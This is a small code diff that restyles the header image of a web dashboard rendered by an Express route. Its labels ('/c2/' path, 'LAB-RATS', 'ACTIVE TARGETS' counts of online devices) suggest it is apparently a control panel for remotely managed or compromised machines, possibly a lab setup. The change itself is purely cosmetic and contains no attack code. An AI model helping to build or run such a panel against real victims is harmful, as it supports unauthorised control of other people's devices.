@@ -527,7 +527,7 @@ app.get('/', (req, res) => {
 <body>
     <div class="container">
         <div class="header" style="text-align:center; padding:5px 0; margin-bottom:5px;">
-            <img src="/c2/header_dashboard.png?v=${Date.now()}" style="width: 51.0%; max-width: 559px; height: auto; margin: 0 auto; display: block; object-fit: contain;" alt="LAB-RATS Header">
+            <img src="/c2/header_dashboard.png?v=${Date.now()}" style="width: 58.7%; max-width: 643px; height: auto; margin: 0 auto; display: block; transform: scale(1.10, 1.03); object-fit: contain;" alt="LAB-RATS Header">
             <div style="font-size: 0.6rem; color: var(--neon-cyan); letter-spacing: 3px; text-transform: uppercase; margin-top: 15px; text-align: center;">SYSTEM STATUS: <span style="color:#39ff14;">ONLINE</span> &nbsp;//&nbsp; ACTIVE TARGETS: <span style="color:#00f2ff; font-weight:bold;">${onlineCount} / ${deviceList.length}</span> &nbsp;//&nbsp; TIMEZONE: <span style="color:#ffff00;">Ottawa (America/Toronto)</span></div>
         </div>
 
